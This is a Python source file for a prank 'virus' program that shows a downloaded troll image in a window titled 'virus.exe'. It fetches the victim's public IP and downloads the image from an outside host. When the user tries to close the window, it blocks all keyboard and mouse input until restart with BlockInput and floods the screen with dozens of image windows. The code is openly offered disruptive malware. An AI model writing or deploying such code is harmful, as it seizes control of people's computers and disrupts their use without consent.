import pygame
import shutil
import requests
from random import randint
from ctypes import windll
from PIL import Image

# initialize pygame
pygame.init()

# get the public ip of the victim
ip = requests.get('https://api.ipify.org').content.decode('utf8')

# download the troll image
def download_image(url: str, file_to_save: str):
	response = requests.get(url, stream=True)

	with open(file_to_save, 'wb') as out_file:
		shutil.copyfileobj(response.raw, out_file)
	del response

troll_image = download_image("https://k.img.mu/1BoJac.jpg", "troll.png")

# create a new image
def new_image(number: int):
	"""Creates a new image times the number specified."""

	img = Image.open("troll.png")
	for i in range(number):
		img.show()

running = True

# window settings
screen = pygame.display.set_mode((640, 640))
window_icon = pygame.image.load("troll.png")

pygame.display.set_caption("virus.exe")
pygame.display.set_icon(window_icon)

background = pygame.image.load("troll.png")

# virus loop
while running:
	# refresh the window
	screen.blit(background, (0, 0))
	pygame.display.flip()

	# opens a lot of images if the cross in the top right corner is pressed
	for event in pygame.event.get():
		if event.type == pygame.QUIT:
			# block user input until computer restarts
			windll.user32.BlockInput(True)
			new_image(randint(30, 100))
